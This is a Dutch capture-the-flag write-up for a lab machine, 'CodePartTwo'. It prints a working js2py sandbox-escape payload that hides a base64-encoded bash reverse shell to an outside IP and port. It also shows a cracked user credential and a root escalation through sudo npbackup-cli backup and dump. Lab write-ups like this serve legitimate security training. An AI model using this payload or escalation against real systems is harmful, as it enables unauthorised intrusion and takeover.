# CodePartTwo

Er draait niks op poort 80 maar na een snelle nmap zie ik een server op poort
8000. Zo te zien draait hier een python code sandbox voor javascript code.

Nu is deze app opensource dus we kunnen gewoon alles downloaden en daar zien we
dat een python library wordt gebruikt die vatbaar is. Gebaseerd op de volgende
[research](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/analysis_en.md)
zien we dat er een sandbox escape is.

Na testen zien we niet alle data terugkomen, er gaat iets mis met serialiseren
maar als we een `curl` command uitvoeren zien we wel requests binnenkomen. We
hebben dus RCE!

Met de volgende payload krijg ik een revshell

```js
let cmd = 'bash -c "$(echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi85MDAxIDA+JjE= | base64 -d)"'

let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
let obj = a(a(a,"__class__"), "__base__")
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

## De DB

We downloaden de hashes uit de user data tabel van de server en hier vinden we
een wachtwoord. 

```
marco:649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

En hierbij hebben we gelijk SSH access.

## Privesc

We mogen met sudo `npbackup-cli` draaien. Het is relatief makkelijk om de root
folder mee te nemen in de backup die we daarna met `--dump` kunnen dumpen.
Hiermee hebben we de root flag te pakken.
